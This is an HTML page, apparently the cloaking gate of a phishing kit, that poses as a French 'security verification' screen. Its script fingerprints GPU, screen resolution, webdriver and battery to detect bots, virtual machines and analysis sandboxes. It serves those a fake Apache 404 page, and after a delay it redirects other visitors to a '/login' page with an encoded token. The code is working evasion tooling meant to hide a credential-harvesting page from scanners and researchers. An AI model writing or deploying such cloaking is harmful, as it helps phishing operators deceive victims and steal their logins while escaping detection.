<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Patientez...</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .box {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 450px;
            border: 1px solid #eee;
        }

        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #0078d4;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        h1 {
            font-size: 1.2rem;
            color: #333;
            margin-bottom: 10px;
            font-weight: 600;
        }

        p {
            color: #888;
            font-size: 0.9rem;
            line-height: 1.5;
        }
    </style>
</head>

<body>
    <div class="box" id="content">
        <div class="spinner"></div>
        <h1>Vérification de sécurité en cours</h1>
        <p>Afin de garantir la sécurité de votre connexion, veuillez patienter pendant que nous validons votre accès.
        </p>
        <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA" data-callback="verifyHuman"></div>
    </div>

    <script>
        // --- VANTABLACK ADVANCED POLYMORPHIC CLOAKING ---
        const BANNED_UA = ["Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "facebookexternalhit", "MetaInspector", "Microsoft"];

        function getFingerprint() {
            // Détection GPU
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";

            return {
                gpu: gpu,
                res: `${window.screen.width}x${window.screen.height}`,
                platform: navigator.platform,
                webdriver: navigator.webdriver
            };
        }

        async function isSandbox() {
            const fp = getFingerprint();
            // 1. Détection Driver (Bots)
            if (fp.webdriver) return true;
            // 2. Détection GPU Software (Sandboxes)
            if (fp.gpu.includes("SwiftShader") || fp.gpu.includes("VMware") || fp.gpu.includes("VirtualBox")) return true;
            // 3. Résolution Bizarre (Analyse Automatisée)
            if (window.screen.width < 800 || window.screen.height < 600) return true;

            // 4. Test Batterie (Les sandbox n'ont souvent pas de batterie ou 100% fixe)
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                if (battery.charging && battery.level === 1.0) {
                    // Possible Sandbox, mais on reste prudent
                }
            }
            return false;
        }

        async function verifyHuman(token) {
            if (await isSandbox()) {
                // CLOAKING : Afficher une erreur 404 silencieuse
                document.body.innerHTML = `
                    <div style="padding: 20px; font-family: sans-serif;">
                        <h1>404 Not Found</h1>
                        <p>The requested URL was not found on this server.</p>
                        <hr><address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
                    </div>`;
                return;
            }

            const fp = getFingerprint();
            const device = /android|iphone|ipad/i.test(navigator.userAgent) ? "mobile" : "desktop";

            setTimeout(() => {
                const payload = btoa(JSON.stringify({ v: token, d: device, f: fp.res }));
                window.location.href = "/login?auth=" + payload.substring(0, 32);
            }, 1000);
        }
    </script>
</body>

</html>
